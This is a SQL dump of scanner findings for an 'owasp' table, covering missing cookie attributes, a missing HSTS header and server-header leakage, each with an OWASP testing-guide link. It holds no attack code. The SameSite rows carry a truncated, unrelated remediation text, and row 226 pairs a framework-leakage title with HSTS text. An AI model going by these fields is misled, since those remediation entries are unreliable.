(204, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 181, 'Low'),
(205, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 181, 'Low'),
(206, 'Web Server Infomation Leakage through Server header', 'Accurately discovering the type of web server that an application runs on can enable security testers to determine if the application is vulnerable to attack. In particular, servers running older versions of software without up-to-date security patches can be susceptible to known version-specific exploits.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific server vulnerabilities that can be used to exploit unpatched servers. For this reason it is recommended that some precautions be taken. These actions include:\n\nObscuring web server information in headers, such as with Apache’s mod_headers module.\nUsing a hardened reverse proxy server to create an additional layer of security between the web server and the Internet.\nEnsuring that web servers are kept up-to-date with the latest software and security patches.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 181, 'Low'),
(207, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 181, 'Low'),
(208, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 182, 'Low'),
(209, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 182, 'Low'),
(210, 'Web Server Infomation Leakage through Server header', 'Accurately discovering the type of web server that an application runs on can enable security testers to determine if the application is vulnerable to attack. In particular, servers running older versions of software without up-to-date security patches can be susceptible to known version-specific exploits.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific server vulnerabilities that can be used to exploit unpatched servers. For this reason it is recommended that some precautions be taken. These actions include:\n\nObscuring web server information in headers, such as with Apache’s mod_headers module.\nUsing a hardened reverse proxy server to create an additional layer of security between the web server and the Internet.\nEnsuring that web servers are kept up-to-date with the latest software and security patches.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 182, 'Low'),
(211, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 182, 'Low'),
(212, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 183, 'Low'),
(213, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 183, 'Low'),
(214, 'Web Server Infomation Leakage through Server header', 'Accurately discovering the type of web server that an application runs on can enable security testers to determine if the application is vulnerable to attack. In particular, servers running older versions of software without up-to-date security patches can be susceptible to known version-specific exploits.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific server vulnerabilities that can be used to exploit unpatched servers. For this reason it is recommended that some precautions be taken. These actions include:\n\nObscuring web server information in headers, such as with Apache’s mod_headers module.\nUsing a hardened reverse proxy server to create an additional layer of security between the web server and the Internet.\nEnsuring that web servers are kept up-to-date with the latest software and security patches.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 183, 'Low'),
(215, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 183, 'Low'),
(216, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 184, 'Low'),
(217, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 184, 'Low'),
(218, 'Web Server Infomation Leakage through Server header', 'Accurately discovering the type of web server that an application runs on can enable security testers to determine if the application is vulnerable to attack. In particular, servers running older versions of software without up-to-date security patches can be susceptible to known version-specific exploits.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific server vulnerabilities that can be used to exploit unpatched servers. For this reason it is recommended that some precautions be taken. These actions include:\n\nObscuring web server information in headers, such as with Apache’s mod_headers module.\nUsing a hardened reverse proxy server to create an additional layer of security between the web server and the Internet.\nEnsuring that web servers are kept up-to-date with the latest software and security patches.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 184, 'Low'),
(219, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 184, 'Low'),
(220, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 185, 'Low'),
(221, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 185, 'Low');
INSERT INTO `owasp` (`OID`, `Vul_name`, `Vul_des`, `vul_sol`, `vul_ref`, `payloadlist`, `OType`, `PID`, `Severity`) VALUES
(222, 'Web Server Infomation Leakage through Server header', 'Accurately discovering the type of web server that an application runs on can enable security testers to determine if the application is vulnerable to attack. In particular, servers running older versions of software without up-to-date security patches can be susceptible to known version-specific exploits.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific server vulnerabilities that can be used to exploit unpatched servers. For this reason it is recommended that some precautions be taken. These actions include:\n\nObscuring web server information in headers, such as with Apache’s mod_headers module.\nUsing a hardened reverse proxy server to create an additional layer of security between the web server and the Internet.\nEnsuring that web servers are kept up-to-date with the latest software and security patches.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 185, 'Low'),
(223, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 185, 'Low'),
(224, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 186, 'Low'),
(225, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 187, 'Low'),
(226, 'Web Application Framework Infomation Leakage', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 188, 'Medium'),
(227, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 199, 'Low'),
(228, 'Missing Expires Attribute in Cookie Header', 'The Expires attribute is used to:\n- set persistent cookies\n- limit lifespan if a session lives for too long\n- remove a cookie forcefully by setting it to a past date\n- Unlike session cookies, persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.', 'Implement Expires Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 199, 'Low'),
(229, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 199, 'Low'),
(230, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 199, 'Low'),
(231, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 200, 'Low'),
(232, 'Missing Expires Attribute in Cookie Header', 'The Expires attribute is used to:\n- set persistent cookies\n- limit lifespan if a session lives for too long\n- remove a cookie forcefully by setting it to a past date\n- Unlike session cookies, persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.', 'Implement Expires Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 200, 'Low'),
(233, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 200, 'Low'),
(234, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 200, 'Low'),
(235, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 201, 'Low'),
(236, 'Missing Expires Attribute in Cookie Header', 'The Expires attribute is used to:\n- set persistent cookies\n- limit lifespan if a session lives for too long\n- remove a cookie forcefully by setting it to a past date\n- Unlike session cookies, persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.', 'Implement Expires Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 201, 'Low'),
(237, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 201, 'Low'),
(238, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 201, 'Low'),
(239, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 202, 'Low'),
(240, 'Missing Expires Attribute in Cookie Header', 'The Expires attribute is used to:\n- set persistent cookies\n- limit lifespan if a session lives for too long\n- remove a cookie forcefully by setting it to a past date\n- Unlike session cookies, persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.', 'Implement Expires Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 202, 'Low'),
(241, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 202, 'Low'),
(242, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 202, 'Low'),
(243, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 203, 'Low'),
(244, 'Missing Expires Attribute in Cookie Header', 'The Expires attribute is used to:\n- set persistent cookies\n- limit lifespan if a session lives for too long\n- remove a cookie forcefully by setting it to a past date\n- Unlike session cookies, persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.', 'Implement Expires Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 203, 'Low'),
(245, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 203, 'Low'),
(246, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 203, 'Low'),
(247, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 204, 'Low'),
(248, 'Missing Expires Attribute in Cookie Header', 'The Expires attribute is used to:\n- set persistent cookies\n- limit lifespan if a session lives for too long\n- remove a cookie forcefully by setting it to a past date\n- Unlike session cookies, persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.', 'Implement Expires Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 204, 'Low'),
(249, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 204, 'Low'),
(250, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 204, 'Low'),
(251, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 205, 'Low'),
(252, 'Missing Expires Attribute in Cookie Header', 'The Expires attribute is used to:\n- set persistent cookies\n- limit lifespan if a session lives for too long\n- remove a cookie forcefully by setting it to a past date\n- Unlike session cookies, persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.', 'Implement Expires Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 205, 'Low'),
(253, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 205, 'Low'),
